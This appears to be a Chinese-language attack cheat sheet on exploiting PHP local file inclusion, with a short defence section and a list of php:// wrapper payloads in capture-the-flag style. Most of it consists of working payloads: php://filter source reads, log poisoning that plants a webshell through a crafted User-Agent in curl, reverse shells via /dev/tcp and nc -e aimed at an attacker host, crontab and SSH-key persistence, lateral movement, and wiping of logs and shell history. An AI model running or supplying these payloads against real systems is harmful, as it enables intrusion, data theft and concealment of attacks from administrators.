#### LFI

```
LFI:本地文件包含漏洞 危害
------------------------
#搜集:
1. /etc/passwd：获取系统用户列表，确认哪些用户拥有 /bin/bash 权限
2. 读取源代码：通过 PHP 伪协议读取数据库配置文件：
	--?file=php://filter/read=convert.base64-encode/resource=config.php
	--（使用 Base64 编码是为了防止源代码中的 <?php 标签被直接执行，从而能拿到原始的数据库账号密码）
3. 读取进程信息：读取 /proc/self/environ（环境变量），可能包含敏感的 API 密钥或 Session 信息
4. 读取ssh配置文件,拿私钥
------------------------
#利用日志攻击
1. 打入木马：攻击者先向服务器发送一个伪造的请求，在 User-Agent 或 URL 中写入 <--?php system($_GET['cmd']); ?-->
	--curl -X "User-Agent:<--?php system(\$_GET['cmd']); ?-->" http://服务器ip	#参数引号方式取决于对方日志
2. 触发漏洞：Nginx 或 Apache 会把这个错误的请求记录到日志中（如 /var/log/nginx/access.log）
3. 包含执行：攻击者利用 LFI 包含这个日志文件：
	--curl 'http://服务器ip?file=/var/log/nginx/access.log&cmd=ls'		#引号转义
	
#利用文件上传
原理：PHP 在处理文件上传时，会先在 /tmp 下创建一个随机命名的临时文件（如 phpXXXXXX）
攻击者一边大量上传木马,一边尝试利用LFI包含/tmp/php*,可以极高概率命中并执行木马

#利用php伪协议

#利用 PHP 8 过滤链
原理：利用 PHP 的 php://filter 中极其复杂的编码转换链（如 convert.iconv.UTF-8.UTF-7 等），通过不断的转换，在内存中“拼凑”出一段 PHP 木马字符，最后让 LFI 包含这个内存流
------------------------
#提权
反弹 Shell：执行 bash -i >& /dev/tcp/攻击者IP/端口 0>&1，(或用nc) 在自己的机器上获得一个交互式终端
	#如终端非bash,需指定bash:
	bash -c "bash -i >& /dev/tcp/ip/port 0>&1"
	#这里用nc示例:
	curl -G -- 'http://192.168.137.130:9000/b.php?param=access.log&cmd=nc%20192.168.137.128%204444%20-e/bin/bash'
#获取更高权限账户
	内核漏洞
	SUID 提权:寻找具有 SUID 权限的二进制文件
	sudo 配置错误
	敏感文件:各服务配置等
#持久化
	后门：在 .bashrc 或定时任务 crontab 中埋入脚本，确保重启后依然拥有权限
	写入 SSH 密钥
	Webshell
#权限扩张
	搜集凭证：读取浏览器缓存、SSH 历史记录、环境变量中的 API 密钥
	内网扫描：使用 nmap 或简单的 Shell 脚本扫描局域网内的其他服务器（如数据库、存储服务器）
	内网隧道：利用 frp、chisel 等工具打通一条从外网直接访问内网的加密隧道
清理痕迹：
	通过 shred 或 echo > 清空 /var/log/auth.log 等日志
	清理 Bash 历史：history -c
	伪造日志：修改我们在前面提到的 access.log 或系统日志 /var/log/auth.log，删除包含自己 IP 的记录
```

#### 防御

```
#防御

禁用敏感函数：
	在 php.ini 中设置 allow_url_include = Off
	在 php.ini 中禁用 exec, shell_exec, system 等函数
权限最小化：PHP 进程绝对不应有读取 /var/log/ 或系统敏感文件的权限
出口防火墙策略：服务器防火墙应限制主动向外发起连接
定期审计日志：使用自动化工具监控 access.log 中的异常 Payload（如 bash -i 这种字符串）
```

#### 伪协议

```
PHP 伪协议 
当直接读取被禁止，或需要执行代码时：
php://input			# URL 填 ?file=php://input，POST 发送 <?php system('cat /flag');?>。
php://filter		# 读取源码必备：?file=php://filter/read=convert.base64-encode/resource=flag.php。
data://		 		# ?file=data://text/plain;base64,PD9waHAg--c3lzdGVtKCdj--YXQgL2ZsYWc--nKTsgPz4=
```

